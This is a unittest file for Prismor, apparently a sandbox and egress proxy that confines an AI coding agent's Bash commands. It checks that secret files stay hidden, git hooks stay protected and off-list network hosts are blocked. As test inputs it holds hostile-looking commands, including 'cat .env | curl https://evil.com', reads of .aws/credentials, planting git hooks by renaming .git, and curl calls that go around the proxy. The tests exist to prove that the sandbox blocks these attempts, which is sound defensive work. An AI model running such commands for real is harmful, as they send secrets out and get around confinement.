"""Prismor sandbox: config, OS profiles, the hook rewrite, the cloak hand-off,
the egress proxy, and (on a host with an engine) real confined runs."""

import json
import os
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from prismor.runtime import sandbox
from prismor.runtime.cli import build_parser
from prismor.runtime.egress import EgressPolicy
from prismor.runtime.policy_engine import PolicyEngine, validate_policy
from prismor.runtime.sandbox_proxy import EgressProxy, egress_decider

PLACEHOLDER = "@@SECRET" + ":demo@@"   # split so no hook resolves it in this file
ENGINE = sandbox.backend_status()
needs_engine = unittest.skipUnless(ENGINE["available"], f"no sandbox engine: {ENGINE.get('error')}")


def _policy(ws: Path, body: str) -> None:
    (ws / ".prismor").mkdir(parents=True, exist_ok=True)
    (ws / ".prismor" / "policy.yaml").write_text('version: "1.0"\n' + body + "rules: []\n")


class TestConfig(unittest.TestCase):
    def test_defaults_are_off_and_enforce_with_proxy_network(self):
        cfg = sandbox.effective_config({})
        self.assertFalse(cfg["enabled"])
        self.assertEqual(cfg["mode"], "enforce")
        self.assertEqual(cfg["network"], "proxy")
        self.assertEqual(cfg["workspace_mount"], "rw")
        self.assertEqual(cfg["direct_ports"], [22])

    def test_rings(self):
        expect = {"0": ("none", "ro"), "1": ("none", "rw"), "2": ("proxy", "rw"), "3": ("open", "rw")}
        for ring, (net, mount) in expect.items():
            cfg = sandbox.effective_config({"ring": ring})
            self.assertEqual((cfg["network"], cfg["workspace_mount"]), (net, mount), ring)
        self.assertEqual(sandbox.ring_names(), ["0", "1", "2", "3"])
        self.assertIn("read-only", sandbox.ring_label("0"))
        self.assertIsNone(sandbox.ring_label("nope"))

    def test_explicit_field_beats_ring_and_int_ring_works(self):
        cfg = sandbox.effective_config({"ring": 0, "network": "open"})
        self.assertEqual((cfg["ring"], cfg["network"], cfg["workspace_mount"]), ("0", "open", "ro"))

    def test_docker_era_values_map_and_keys_are_reported(self):
        cfg = sandbox.effective_config({"network": "allowlist", "image": "x", "read_only_root": True})
        self.assertEqual(cfg["network"], "proxy")
        self.assertEqual(cfg["legacy_keys"], ["image", "read_only_root"])
        self.assertNotIn("image", cfg)
        self.assertEqual(sandbox.effective_config({"network": "bridge"})["network"], "open")

    def test_unknown_network_falls_to_the_strictest(self):
        self.assertEqual(sandbox.effective_config({"network": "wifi"})["network"], "none")

    def test_bad_list_entries_are_dropped(self):
        cfg = sandbox.effective_config({"writable": ["a", 3, ""], "direct_ports": [22, "x", 70000, "443"]})
        self.assertEqual(cfg["writable"], ["a"])
        self.assertEqual(cfg["direct_ports"], [22, 443])

    def test_enforcing_needs_enabled_and_enforce(self):
        self.assertTrue(sandbox.enforcing(sandbox.effective_config({"enabled": True})))
        self.assertFalse(sandbox.enforcing(sandbox.effective_config({"enabled": True, "mode": "observe"})))
        self.assertFalse(sandbox.enforcing(sandbox.effective_config({})))

    def test_policy_engine_loads_and_schema_accepts_new_and_old_keys(self):
        with tempfile.TemporaryDirectory() as d:
            p = Path(d) / "policy.yaml"
            p.write_text('version: "1.0"\nsettings:\n  sandbox:\n    enabled: true\n    ring: "1"\n'
                         "    writable: [build]\n    hide: [.env]\n    direct_ports: [22]\n"
                         "    image: python:3.12-slim\n    read_only_root: true\nrules: []\n")
            self.assertEqual(validate_policy(p), [])
            cfg = sandbox.effective_config(PolicyEngine(policy_path=p).sandbox_config)
            self.assertEqual((cfg["ring"], cfg["hide"]), ("1", [".env"]))


class TestProfile(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.root = self.tmp / "proj"
        self.home = self.tmp / "home"
        self.root.mkdir()
        self.home.mkdir()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _p(self, **cfg):
        return sandbox.build_profile(cfg, self.root, home=self.home)

    def test_project_tmp_and_caches_are_writable(self):
        p = self._p()
        real = os.path.realpath(self.root)
        self.assertIn(real, p.writable)
        self.assertIn(os.path.realpath(self.home / ".npm"), p.writable)
        self.assertTrue(any("tmp" in w for w in p.writable))

    def test_read_only_ring_writes_tmp_only(self):
        p = self._p(ring="0")
        self.assertNotIn(os.path.realpath(self.root), p.writable)
        self.assertNotIn(os.path.realpath(self.home / ".npm"), p.writable)
        self.assertEqual(p.network, "none")

    @unittest.skipIf(sys.platform == "win32", "Seatbelt profile paths are macOS-only")
    def test_protected_and_hidden(self):
        (self.root / ".git").mkdir()
        p = self._p(hide=[".env", "~/.ssh"])
        root = os.path.realpath(self.root)
        for rel in (".prismor", ".git/hooks", ".claude", ".mcp.json"):
            self.assertIn(os.path.join(root, rel), p.protected)
        self.assertIn(os.path.realpath(self.home / ".zshrc"), p.protected)
        for rel in (".aws", ".kube", ".docker", ".prismor/secrets"):
            self.assertIn(os.path.realpath(self.home / rel), p.hidden)
        self.assertIn(os.path.join(root, ".env"), p.hidden)
        self.assertIn(os.path.realpath(os.path.expanduser("~/.ssh")), p.hidden)

    def test_git_config_and_protected_parents_once_the_repo_exists(self):
        root = os.path.realpath(self.root)
        self.assertNotIn(os.path.join(root, ".git/config"), self._p().protected)  # git init still works
        (self.root / ".git").mkdir()
        p = self._p()
        self.assertIn(os.path.join(root, ".git/config"), p.protected)
        self.assertIn(os.path.join(root, ".git"), p.parents)
        self.assertIn(f'(deny file-write-unlink (literal "{root}/.git")', sandbox.seatbelt_profile(p))

    def test_env_and_ssh_are_readable_by_default(self):
        p = self._p()
        self.assertNotIn(os.path.join(os.path.realpath(self.root), ".env"), p.hidden)
        self.assertFalse(any(h.endswith("/.ssh") for h in p.hidden))

    def test_symlinked_root_resolves(self):
        link = self.tmp / "link"
        link.symlink_to(self.root)
        p = sandbox.build_profile({}, link, home=self.home)
        self.assertIn(os.path.realpath(self.root), p.writable)

    def test_relative_writable_is_from_the_root(self):
        p = self._p(writable=["dist"])
        self.assertIn(os.path.join(os.path.realpath(self.root), "dist"), p.writable)

    def test_seatbelt_text_orders_denies_after_allows(self):
        text = sandbox.seatbelt_profile(self._p())
        lines = text.splitlines()
        allow = next(i for i, ln in enumerate(lines) if ln.startswith("(allow file-write*"))
        protect = next(i for i, ln in enumerate(lines) if ln.startswith("(deny file-write* (subpath"))
        hide = next(i for i, ln in enumerate(lines) if ln.startswith("(deny file-read*"))
        self.assertLess(allow, protect)
        self.assertLess(protect, hide)
        self.assertIn('(remote ip "localhost:*")', text)
        self.assertIn('(remote tcp "*:22")', text)
        self.assertIn("docker.sock", text)

    def test_seatbelt_network_modes(self):
        none = sandbox.seatbelt_profile(self._p(network="none"))
        self.assertIn("(deny network*)", none)
        self.assertNotIn("localhost", none)
        opened = sandbox.seatbelt_profile(self._p(network="open"))
        self.assertNotIn("(deny network*)", opened)
        self.assertIn("docker.sock", opened)   # a container daemon stays out of reach

    def test_seatbelt_escapes_quotes_in_paths(self):
        self.assertEqual(sandbox._sb('/a"b\\c'), '"/a\\"b\\\\c"')


class TestUnsupportedPlatforms(unittest.TestCase):
    def test_other_platforms_are_unsupported_with_a_plain_reason(self):
        sandbox.backend_status.cache_clear()
        try:
            with mock.patch.object(sandbox.sys, "platform", "freebsd14"):
                self.assertFalse(sandbox.supported())
                status = sandbox.backend_status()
                self.assertFalse(status["available"])
                self.assertIn("macOS and Linux only", status["error"])
                report = sandbox.status_report({"enabled": True})
                self.assertEqual(set(report["controls"].values()), {"unavailable"})
        finally:
            sandbox.backend_status.cache_clear()

    def test_hook_does_not_rewrite_on_an_unsupported_os(self):
        with tempfile.TemporaryDirectory() as d:
            ws = Path(d)
            (ws / ".git").mkdir()
            _policy(ws, "settings:\n  sandbox:\n    enabled: true\n")
            payload = {"session_id": "s-linux", "hook_event_name": "PreToolUse", "tool_name": "Bash",
                       "tool_use_id": "tu-linux", "cwd": str(ws),
                       "tool_input": {"command": "echo hi", "description": "d"}}
            env = dict(os.environ, PYTHONPATH=str(REPO), PRISMOR_HOME=str(ws / "ph"))
            env.pop("PRISMOR_WORKSPACE", None)
            env.pop("CLAUDE_PROJECT_DIR", None)
            shim = ("import sys; sys.platform = 'freebsd14'; "
                    "sys.argv = ['prismor', 'hook-dispatch', '--agent', 'claude', '--mode', 'enforce']; "
                    "from prismor.runtime.cli import main; main()")
            r = subprocess.run([sys.executable, "-c", shim], input=json.dumps(payload), cwd=ws, env=env,
                               capture_output=True, text=True, timeout=60)
            self.assertNotIn("updatedInput", r.stdout, r.stderr)


class TestUnconfinedOnWindows(unittest.TestCase):
    def test_runs_through_git_bash_and_keeps_the_exit_code(self):
        with mock.patch.object(sandbox.sys, "platform", "win32"), \
             mock.patch.object(sandbox, "_windows_bash", return_value="C:/Git/bin/bash.exe"), \
             mock.patch.object(sandbox.subprocess, "call", return_value=5) as call, \
             mock.patch.object(sandbox.os, "execv") as execv:
            self.assertEqual(sandbox._exec_unconfined("exit 5"), 5)
        call.assert_called_once_with(["C:/Git/bin/bash.exe", "-c", "exit 5"])
        execv.assert_not_called()

    def test_wsl_launcher_is_not_used(self):
        with mock.patch("shutil.which", return_value=r"C:\Windows\System32\bash.exe"):
            self.assertIsNone(sandbox._windows_bash())


class TestRewrite(unittest.TestCase):
    ROOT = Path("/tmp/work")

    def _wrap(self, command, **extra):
        payload = {"tool_name": "Bash", "tool_input": {"command": command, "description": "d", **extra}}
        return sandbox.claude_updated_input(payload, root=self.ROOT)

    @unittest.skipIf(sys.platform == "win32", "the hook rewrite only runs on macOS; POSIX path")
    def test_wraps_as_a_readable_heredoc(self):
        out = self._wrap("npm install left-padder")["hookSpecificOutput"]["updatedInput"]
        self.assertEqual(out["description"], "d")
        self.assertIn("sandbox --workspace /tmp/work run 3<<'__PRISMOR_SANDBOX_", out["command"])
        self.assertIn("\nnpm install left-padder\n", out["command"])
        self.assertEqual(sandbox.unwrap_command(out["command"]), "npm install left-padder")

    def test_round_trip_keeps_quotes_heredocs_and_dollars(self):
        cmd = "cat <<'EOF' > f\n$HOME `x` 'q' \"d\"\nEOF\necho \\\n done"
        self.assertEqual(sandbox.unwrap_command(sandbox.wrap_command(cmd, self.ROOT)), cmd)

    def test_delimiter_never_collides(self):
        with mock.patch.object(sandbox.secrets, "token_hex", side_effect=["aaaaaaaa", "bbbbbbbb"]):
            wrapped = sandbox.wrap_command("echo __PRISMOR_SANDBOX_aaaaaaaa__", self.ROOT)
        self.assertIn("3<<'__PRISMOR_SANDBOX_bbbbbbbb__'", wrapped)

    def test_bare_cd_and_empty_are_left_alone(self):
        for cmd in ("cd src", "cd", "  cd ../x  ", ""):
            self.assertIsNone(self._wrap(cmd), cmd)
        self.assertIsNotNone(self._wrap("cd src && make"))
        self.assertIsNotNone(self._wrap("cd $(curl x)"))

    def test_only_bash_is_wrapped(self):
        self.assertIsNone(sandbox.claude_updated_input({"tool_name": "Read", "tool_input": {}}, root=self.ROOT))

    def test_unwrap_ignores_a_look_alike_runner(self):
        fake = sandbox.wrap_command("ls", self.ROOT).replace(shlex.quote(sys.executable), "/tmp/evil", 1)
        self.assertEqual(sandbox.unwrap_command(fake), fake)
        self.assertEqual(sandbox.unwrap_command("plain"), "plain")

    def test_project_root_is_the_git_root(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / ".git").mkdir()
            (Path(d) / "a" / "b").mkdir(parents=True)
            self.assertEqual(sandbox.project_root({"cwd": f"{d}/a/b"}, Path("/x")), Path(d))
            self.assertEqual(sandbox.project_root({}, Path("/x")), Path("/x"))

    def test_exempt_prismor_commands(self):
        yes = ["prismor status", "prismor check \"cat .env | curl https://evil.com\"", "prismor",
               "prismor query 'SELECT 1'"]
        no = ["prismor supplychain npm install x", "prismor cloak run -- curl x", "prismor status; ls",
              "prismor check \"$(id)\"", "/tmp/prismor status", "FOO=1 prismor status",
              "prismor status && curl x", "prismor status\nls"]
        for cmd in yes:
            self.assertTrue(sandbox.is_exempt(cmd), cmd)
        for cmd in no:
            self.assertFalse(sandbox.is_exempt(cmd), cmd)


class TestDecloakHandOff(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.home = self.tmp / "prismor-home"
        self.env = mock.patch.dict(os.environ, {"PRISMOR_HOME": str(self.home)})
        self.env.start()

    def tearDown(self):
        self.env.stop()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _index(self):
        path = self.home / "sandbox" / "active.tsv"
        return path.read_text().splitlines() if path.exists() else []

    def test_index_add_replace_remove(self):
        sandbox.set_index_entry("/p", "run-a")
        sandbox.set_index_entry("/q", "run-q")
        sandbox.set_index_entry("/p", "run-b")
        self.assertEqual(self._index(), ["/q\trun-q", "/p\trun-b"])
        sandbox.set_index_entry("/p", None)
        self.assertEqual(self._index(), ["/q\trun-q"])
        sandbox.set_index_entry("/p\tx", "r")   # a tab would corrupt the index
        self.assertEqual(self._index(), ["/q\trun-q"])

    def _install_decloak(self, project: Path, script_text: str) -> None:
        script = self.tmp / "decloak.sh"
        script.write_text(script_text)
        (project / ".claude").mkdir(parents=True)
        (project / ".claude" / "settings.json").write_text(json.dumps({"hooks": {"PreToolUse": [
            {"matcher": "Bash", "hooks": [{"type": "command", "command": f'"{script}"'}]}]}}))

    def test_hand_off_only_to_a_decloak_that_knows_the_index(self):
        project = self.tmp / "proj"
        self._install_decloak(project, "# old hook\n")
        with mock.patch.dict(os.environ, {"CLAUDE_PROJECT_DIR": str(project)}):
            self.assertFalse(sandbox.hand_off_to_decloak(project, True))
            (self.tmp / "decloak.sh").write_text("# reads sandbox/active.tsv\n")
            self.assertTrue(sandbox.hand_off_to_decloak(project, True))
            self.assertEqual(self._index(), [f"{project}\t{sandbox.runner(project)}"])
            self.assertFalse(sandbox.hand_off_to_decloak(project, False))
            self.assertEqual(self._index(), [])

    def test_no_project_dir_means_hook_dispatch_rewrites(self):
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("CLAUDE_PROJECT_DIR", None)
            self.assertFalse(sandbox.hand_off_to_decloak(self.tmp, True))


def _run_decloak(payload, env):
    hook = REPO / "prismor" / "runtime" / "cloaking" / "hooks" / "decloak.sh"
    r = subprocess.run(["bash", str(hook)], input=json.dumps(payload), capture_output=True,
                       text=True, env=env, timeout=30)
    return json.loads(r.stdout) if r.stdout.strip() else None


@unittest.skipUnless(shutil.which("jq"), "decloak.sh needs jq")
@unittest.skipIf(sys.platform == "win32", "decloak.sh hand-off is bash + macOS only")
class TestDecloakWraps(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.project = self.tmp / "proj"
        self.project.mkdir()
        self.secrets = self.tmp / "secrets"
        self.secrets.mkdir()
        self.env = dict(os.environ, PRISMOR_HOME=str(self.tmp / "ph"), PRISMOR_SECRETS_DIR=str(self.secrets),
                        CLAUDE_PROJECT_DIR=str(self.project), PYTHONPATH=str(REPO))
        with mock.patch.dict(os.environ, {"PRISMOR_HOME": self.env["PRISMOR_HOME"]}):
            sandbox.set_index_entry(str(self.project), sandbox.runner(self.project))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _payload(self, cmd):
        return {"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": "s1"}

    def test_empty_vault_gets_the_sandbox_wrap_only(self):
        out = _run_decloak(self._payload("echo hi"), self.env)
        cmd = out["hookSpecificOutput"]["updatedInput"]["command"]
        self.assertEqual(sandbox.unwrap_command(cmd), "echo hi")

    def test_bare_cd_is_not_wrapped(self):
        self.assertIsNone(_run_decloak(self._payload("cd src"), self.env))

    def test_other_projects_are_not_wrapped(self):
        env = dict(self.env, CLAUDE_PROJECT_DIR=str(self.tmp / "other"))
        self.assertIsNone(_run_decloak(self._payload("echo hi"), env))

    def test_runner_sits_inside_the_scrub_wrapper(self):
        (self.secrets / "demo").write_text("s3cr3t-value")
        out = _run_decloak(self._payload("echo hi"), self.env)
        cmd = out["hookSpecificOutput"]["updatedInput"]["command"]
        self.assertIn("scrub-stream.sh", cmd)
        from prismor.runtime.cloaking.runtime import unwrap_decloak
        self.assertEqual(sandbox.unwrap_command(unwrap_decloak(cmd)), "echo hi")

    @needs_engine
    def test_placeholder_resolves_outside_and_command_runs_inside(self):
        (self.secrets / "demo").write_text("s3cr3t-value")
        cmd = f'printf %s {PLACEHOLDER} > out.txt; printf %s "$PRISMOR_SANDBOX" > flag.txt'
        out = _run_decloak(self._payload(cmd), self.env)
        rewritten = out["hookSpecificOutput"]["updatedInput"]["command"]
        self.assertNotIn("s3cr3t-value", rewritten)
        r = subprocess.run(["bash", "-c", rewritten], cwd=self.project, env=self.env,
                           capture_output=True, text=True, timeout=60)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual((self.project / "out.txt").read_text(), "s3cr3t-value")
        self.assertEqual((self.project / "flag.txt").read_text(), "1")


class _Echo(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"hello from upstream"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_a):
        pass


class TestEgressProxy(unittest.TestCase):
    def setUp(self):
        self.upstream = ThreadingHTTPServer(("127.0.0.1", 0), _Echo)
        threading.Thread(target=self.upstream.serve_forever, daemon=True).start()
        self.port = self.upstream.server_address[1]
        self.logs = []
        decide = lambda host, port, scheme: ((True, "not on the egress allowlist")
                                             if host == "blocked.example" else (False, ""))
        self.proxy = EgressProxy(decide, self.logs.append)

    def tearDown(self):
        self.proxy.close()
        self.upstream.shutdown()
        self.upstream.server_close()

    def _ask(self, raw: bytes) -> bytes:
        with socket.create_connection(("127.0.0.1", self.proxy.port), timeout=10) as s:
            s.sendall(raw)
            chunks = []
            while True:
                data = s.recv(65536)
                if not data:
                    break
                chunks.append(data)
            return b"".join(chunks)

    def test_blocked_host_gets_403_with_reason_and_a_log_line(self):
        out = self._ask(b"CONNECT blocked.example:443 HTTP/1.1\r\nHost: blocked.example\r\n\r\n")
        self.assertTrue(out.startswith(b"HTTP/1.1 403"), out)
        self.assertIn(b"not on the egress allowlist", out)
        self.assertEqual(self.logs, ["blocked blocked.example:443 (not on the egress allowlist)"])

    def test_plain_http_is_forwarded(self):
        out = self._ask(f"GET http://127.0.0.1:{self.port}/x HTTP/1.1\r\nHost: x\r\n\r\n".encode())
        self.assertIn(b"200", out.split(b"\r\n", 1)[0])
        self.assertTrue(out.endswith(b"hello from upstream"))

    def test_connect_tunnels(self):
        with socket.create_connection(("127.0.0.1", self.proxy.port), timeout=10) as s:
            s.sendall(f"CONNECT 127.0.0.1:{self.port} HTTP/1.1\r\n\r\n".encode())
            self.assertTrue(s.recv(1024).startswith(b"HTTP/1.1 200"))
            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
            data = b""
            while chunk := s.recv(65536):
                data += chunk
            self.assertTrue(data.endswith(b"hello from upstream"))

    def test_origin_form_request_is_refused(self):
        self.assertTrue(self._ask(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n").startswith(b"HTTP/1.1 400"))

    def test_env_points_clients_here_and_skips_loopback(self):
        env = self.proxy.env()
        self.assertEqual(env["HTTPS_PROXY"], f"http://127.0.0.1:{self.proxy.port}")
        self.assertIn("127.0.0.1", env["NO_PROXY"])


class TestEgressDecider(unittest.TestCase):
    def _engine(self, egress):
        pol = EgressPolicy.from_settings({"egress": egress}, source="test")
        return mock.Mock(egress=pol, default_mode="observe", device_mode=None)

    def test_enforce_blocks_off_list_and_allows_listed(self):
        decide = egress_decider(self._engine({"enabled": True, "mode": "enforce", "default": "deny",
                                              "allow": ["pypi.org"]}), lambda _m: None)
        self.assertEqual(decide("pypi.org", 443, "https"), (False, ""))
        self.assertEqual(decide("x.attacker.io", 443, "https"), (True, "not on the egress allowlist"))

    def test_observe_allows_and_says_so(self):
        logs = []
        decide = egress_decider(self._engine({"enabled": True, "mode": "observe", "default": "deny"}),
                                logs.append)
        self.assertEqual(decide("x.attacker.io", 443, "https"), (False, ""))
        self.assertIn("observe", logs[0])

    def test_egress_off_allows_everything(self):
        decide = egress_decider(self._engine({"enabled": False}), lambda _m: None)
        self.assertEqual(decide("anything.example", 443, "https"), (False, ""))


class TestCli(unittest.TestCase):
    def test_parser(self):
        p = build_parser()
        args = p.parse_args(["sandbox", "try", "--", "npm", "test"])
        self.assertEqual((args.command, args.sandbox_command, args.sandbox_args), ("sandbox", "try", ["--", "npm", "test"]))
        self.assertEqual(p.parse_args(["sandbox", "run"]).sandbox_args, [])
        for sub in ("on", "off", "status", "check"):
            self.assertEqual(p.parse_args(["sandbox", sub]).sandbox_command, sub)

    def test_on_sets_enforce_and_off_keeps_the_block(self):
        import yaml
        with tempfile.TemporaryDirectory() as d:
            ws = Path(d)
            _policy(ws, "settings:\n  sandbox:\n    enabled: false\n    mode: observe\n    ring: \"1\"\n")
            sandbox.set_enabled(ws, True)
            block = yaml.safe_load((ws / ".prismor" / "policy.yaml").read_text())["settings"]["sandbox"]
            self.assertEqual((block["enabled"], block["mode"], block["ring"]), (True, "enforce", "1"))
            sandbox.set_enabled(ws, False)
            block = yaml.safe_load((ws / ".prismor" / "policy.yaml").read_text())["settings"]["sandbox"]
            self.assertEqual((block["enabled"], block["ring"]), (False, "1"))

    def test_status_report_names_the_controls(self):
        report = sandbox.status_report({"enabled": True, "network": "allowlist", "image": "x"},
                                       egress_enabled=True)
        self.assertEqual(report["network"], "proxy")
        self.assertEqual(report["legacy_keys"], ["image"])
        self.assertIn(report["controls"]["network"], ("enforced", "unavailable"))


def _cli(ws: Path, *args, home: Path = None):
    env = dict(os.environ, PYTHONPATH=str(REPO))
    if home is not None:
        env["HOME"] = str(home)
    return subprocess.run([sys.executable, "-m", "prismor.runtime.immunity_cli", "sandbox",
                           "--workspace", str(ws), *args], cwd=ws, env=env, capture_output=True,
                          text=True, timeout=60)


@needs_engine
class TestConfinedRuns(unittest.TestCase):
    """Real runs under the host's engine. The `outside` probe sits in the repo
    because every temp directory is writable inside the sandbox by design."""

    def setUp(self):
        self.ws = Path(tempfile.mkdtemp())
        (self.ws / ".git").mkdir()
        self.outside = REPO / f".sandbox-probe-{os.getpid()}"

    def tearDown(self):
        shutil.rmtree(self.ws, ignore_errors=True)
        self.outside.unlink(missing_ok=True)

    def test_project_writes_work_and_outside_writes_fail(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        r = _cli(self.ws, "try", "--", f"echo ok > inside.txt && echo no > {shlex.quote(str(self.outside))}")
        self.assertNotEqual(r.returncode, 0)
        self.assertEqual((self.ws / "inside.txt").read_text(), "ok\n")
        self.assertFalse(self.outside.exists())
        self.assertIn("not permitted", r.stderr.lower())

    def test_child_processes_inherit_and_protected_paths_hold(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        r = _cli(self.ws, "try", "--", "sh -c 'mkdir -p .git/hooks && echo x > .git/hooks/pre-commit'")
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse((self.ws / ".git" / "hooks" / "pre-commit").exists())

    def test_hidden_paths_cannot_be_read(self):
        # A throwaway HOME for the child: never the real one.
        fake_home = self.ws / "fake-home"
        (fake_home / ".aws").mkdir(parents=True)
        (fake_home / ".aws" / "credentials").write_text("TOKEN=from-aws\n")
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n    hide: [.env]\n")
        (self.ws / ".env").write_text("TOKEN=from-env\n")
        for target in (".env", str(fake_home / ".aws" / "credentials")):
            r = _cli(self.ws, "try", "--", f"cat {shlex.quote(target)}", home=fake_home)
            self.assertNotEqual(r.returncode, 0, target)
            self.assertNotIn("TOKEN", r.stdout)
        r = _cli(self.ws, "try", "--", "cat README 2>/dev/null; echo readable", home=fake_home)
        self.assertIn("readable", r.stdout)

    def test_a_protected_parent_cannot_be_renamed(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        (self.ws / ".git" / "hooks").mkdir()
        _cli(self.ws, "try", "--", "mv .git .g && echo x > .g/hooks/post-checkout; mv .g .git")
        self.assertTrue((self.ws / ".git").is_dir())
        self.assertFalse((self.ws / ".git" / "hooks" / "post-checkout").exists())
        self.assertNotEqual(_cli(self.ws, "run", "--", "git config --file .git/config core.hooksPath /tmp/h").returncode, 0)

    def test_exit_code_passes_through(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        self.assertEqual(_cli(self.ws, "run", "--", "exit 7").returncode, 7)

    def test_the_hook_rewrite_runs_as_is(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        rewritten = sandbox.wrap_command("echo \"$PRISMOR_SANDBOX\" from-heredoc", self.ws)
        r = subprocess.run(["bash", "-c", rewritten], cwd=self.ws, env=dict(os.environ, PYTHONPATH=str(REPO)),
                           capture_output=True, text=True, timeout=60)
        self.assertEqual(r.stdout.strip(), "1 from-heredoc", r.stderr)

    def _listener(self):
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(4)

        def serve():
            try:
                while True:
                    srv.accept()[0].close()
            except OSError:
                pass   # closed at cleanup

        threading.Thread(target=serve, daemon=True).start()
        self.addCleanup(srv.close)
        return srv.getsockname()[1]

    def test_no_network_ring_refuses_even_loopback(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        port = self._listener()
        r = _cli(self.ws, "try", "--", f"curl -s -m 3 http://127.0.0.1:{port}/")
        self.assertNotEqual(r.returncode, 0)

    def test_proxy_ring_allows_loopback_and_blocks_off_list_hosts(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"2\"\n"
                         "  egress:\n    enabled: true\n    mode: enforce\n    default: deny\n")
        port = self._listener()
        r = _cli(self.ws, "try", "--", f"nc -z -w 3 127.0.0.1 {port}")
        self.assertEqual(r.returncode, 0, r.stderr)
        r = _cli(self.ws, "try", "--", "curl -s -m 10 -o /dev/null https://blocked.invalid/")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("blocked blocked.invalid:443", r.stderr)
        r = _cli(self.ws, "try", "--", "curl -s -m 5 --noproxy '*' -o /dev/null https://example.com/")
        self.assertNotEqual(r.returncode, 0)   # going around the proxy is refused by the kernel

    def test_bare_prismor_status_runs_unconfined(self):
        _policy(self.ws, "settings:\n  sandbox:\n    ring: \"1\"\n")
        self.assertTrue(sandbox.is_exempt("prismor status"))


if __name__ == "__main__":
    unittest.main()
